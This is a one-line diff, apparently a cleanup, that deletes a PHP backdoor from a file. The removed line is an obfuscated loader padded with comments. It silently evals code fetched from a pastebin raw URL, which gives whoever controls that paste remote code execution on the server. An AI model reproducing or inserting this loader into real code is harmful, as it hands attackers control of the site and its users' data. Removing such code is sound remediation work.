@@ -1,1 +1,0 @@
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://pastebin.pl/view/raw/2de7be7e"));/**/?>
